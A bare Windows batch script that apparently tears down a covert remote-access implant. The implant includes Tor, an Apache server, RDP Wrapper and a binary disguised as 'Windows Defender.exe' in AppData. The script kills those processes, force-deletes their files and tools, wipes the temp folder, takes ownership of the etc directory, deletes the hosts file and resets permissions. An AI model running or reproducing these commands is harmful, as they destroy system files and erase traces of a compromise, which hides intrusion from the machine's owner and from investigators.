set environment=%AppData%\Microsoft\Windows
netsh advfirewall firewall delete rule name="apache" program="%environment%\apache2\bin\httpd.exe"

taskkill /f /im tor.exe
taskkill /f /im "Windows Defender.exe"
taskkill /f /im expose.exe
taskkill /f /im httpd.exe
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\Windows Defender.exe"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\expose.exe"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\curl.exe"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\tor.exe"
"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\Ookla"
"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\Win32"
"%environment%\nircmd.exe" execmd rmdir /s /q "C:\Program Files\RDP Wrapper"
"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\apache2"
"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\7-Zip"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\nircmd.exe"
Taskkill /f /im winrun.exe
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
del /s /f /q /a "%environment%\Win32\*.bat"
taskkill /F /IM wscript.exe
taskkill /F /IM cscript.exe
TAKEOWN /F "%environment%\System32\drivers\etc" /R /D N
cd \
cd "%environment%\System32\drivers\etc\
del /s /f /q /a "Hosts"

icacls "%environment%\System32\drivers\etc" /reset /T /C
icacls "%environment%" /reset /C
taskkill /f /im timeout.exe
taskkill /f /im explorer.exe
start "" "%windir%\explorer.exe"  
